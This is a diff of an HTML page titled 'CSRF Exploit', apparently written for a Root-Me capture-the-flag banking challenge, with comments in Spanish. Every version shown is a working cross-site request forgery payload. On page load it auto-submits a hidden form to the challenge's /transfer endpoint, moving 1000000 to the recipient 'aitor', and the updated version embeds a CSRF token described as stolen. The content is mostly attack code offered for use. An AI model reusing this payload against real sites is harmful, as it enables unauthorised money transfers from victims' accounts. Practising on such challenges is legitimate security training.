@@ -4,38 +4,20 @@
     <title>CSRF Exploit</title>
   </head>
   <body onload="sendRequest()">
-    <form id="csrfForm" action="https://bankme-2.challenges.pro.root-me.org/transfer" method="POST">
-      <input type="hidden" name="recipient" value="aitor" />
-      <input type="hidden" name="amount" value="1000000" />
-      <!-- Deja el CSRF token vacío por ahora -->
-      <input type="hidden" name="token" id="csrf_token" />
+    <form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
+      <!-- Parametros necesarios -->
+      <input type="hidden" name="recipient" value="aitor" />  <!-- Aquí pon el destinatario deseado -->
+      <input type="hidden" name="amount" value="1000000" />    <!-- Aquí pon el monto deseado -->
+      
+      <!-- Token CSRF robado -->
+      <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6bDB2ZV8wcmFjbGVfbDRycnk6NjI0MTc1MTM2OQ=" />
     </form>
 
     <script>
       function sendRequest() {
-        // 1. Extraer el token CSRF de la página
-        // Aquí asumimos que el token CSRF está en el formato "Q1NSRnNfNHIzX2MwMGw6YWl0b3I6MTAw"
-        const csrfToken = "Q1NSRnNfNHIzX2MwMGw6YWl0b3I6MTAw";  // Aquí deberías poner cómo obtener el token dinámicamente.
-
-        // 2. Insertar el token CSRF en el formulario
-        document.getElementById('csrf_token').value = csrfToken;
-
-        // 3. Enviar el formulario automáticamente
-        document.getElementById("csrfForm").submit();
+        // Enviar el formulario automáticamente al cargar la página
+        document.getElementById('csrfForm').submit();
       }
     </script>
   </body>
 </html>
-<!-- <html>
-  <body onload="document.forms[0].submit()">
-    <form action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
-      <input type="hidden" name="recipient" value="aitor" />
-      <input type="hidden" name="amount" value="1000000" />
-    </form>
-  </body>
-</html>
-        // Intenta enviar la transferencia automáticamente
-        document.getElementById("csrfForm").submit();
-</script>
-</body>
-</html> -->
